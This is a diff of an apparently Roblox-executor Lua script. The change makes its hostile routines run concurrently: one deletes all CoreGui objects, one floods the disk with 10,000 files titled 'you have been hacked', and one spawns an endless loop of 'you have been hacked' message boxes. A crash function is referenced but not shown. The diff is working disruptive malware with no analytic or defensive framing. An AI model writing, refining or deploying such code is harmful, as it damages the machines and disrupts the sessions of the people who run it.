@@ -27,26 +27,32 @@ local function crash()
 end
 
 local function delete_coregui()
-	for _, v in pairs(CoreGui:GetDescendants()) do
-		v:Destroy()
-		print(`Deleting CoreGui Object: {v}`)
-	end
+	task.spawn(function()
+		for _, v in pairs(CoreGui:GetDescendants()) do
+			v:Destroy()
+			print(`Deleting CoreGui Object: {v}`)
+		end
+	end)
 end
 
 local function filebomb()
-	local text = ("w"):rep(10000)
-	for i = 1, 10000 do
-		writefile("you have been hacked"..i..".txt", text)
-	end
+	task.spawn(function()
+		local text = ("w"):rep(10000)
+		for i = 1, 10000 do
+			writefile("you have been hacked"..i..".txt", text)
+		end
+	end)
 end
 
 local function msgbox()
-	if messagebox then
-		while true do
-			messagebox("you have been hacked", "you have been hacked", 2+16)
-			task.wait()
+	task.spawn(function()
+		if messagebox then
+			while true do
+				messagebox("you have been hacked", "you have been hacked", 2+16)
+				task.wait()
+			end
 		end
-	end
+	end)
 end
 
 -- Music
